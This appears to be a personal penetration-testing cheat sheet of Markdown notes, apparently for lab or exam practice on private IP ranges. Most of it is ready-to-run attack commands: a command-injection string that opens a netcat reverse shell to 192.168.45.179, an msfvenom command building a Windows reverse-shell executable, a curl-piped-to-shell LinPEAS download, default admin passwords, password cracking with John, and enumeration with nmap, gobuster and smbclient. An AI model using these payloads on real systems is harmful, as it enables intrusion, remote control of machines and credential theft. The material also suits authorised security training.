# Notes

## Nmap Scan
```bash
 sudo nmap -p- {ip}
````
```bash
 sudo nmap -p 80 {ip} -sV
````

## Command Injection RCE

```bash
; nc 192.168.45.179 4444 -e /bin/sh; 
```
## SMB Anonymous Login (No Password) Port - 445 TCP

```bash
smbclient -L //<IP>/ -N
```

## Python Server Start

```bash
python -m http.server 80
```


## Netcat Listener

```bash
nc -nlvp {Port}
```

## Proper Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm-256color
```

## Reset Network (Browser / VPN MTU Fix)

```bash
sudo ifconfig tun0 mtu 1250
```

## Metasploit Payload (Windows Reverse Shell EXE)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.160 LPORT=4444 -f exe > shell.exe
```

## Default Passwords

* `admin:admin`
* `admin:password`

## OpenVPN Duplicate Session Kill

```bash
pkill openvpn
```

## Install Python2 + Pip2 (Linux)

```bash
apt install -y python2
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
pip2
```

## Create Custom Wordlist (CeWL)

```bash
cewl http://192.168.184.180:80/ | grep -v CeWL > custom-wordlist.txt
```

## Web Directory Brute Force (Gobuster)

```bash
gobuster dir -u http://192.168.120.224 -w /usr/share/wordlists/dirb/common.txt
```

## Subdomain Enumeration

```bash
subfinder -d domain.com
```


## John Hash 

```bash
john root_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

# LPE

## LinPEAS

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## SUID binaries check

```bash
find / -perm -4000 -type f 2>/dev/null
```


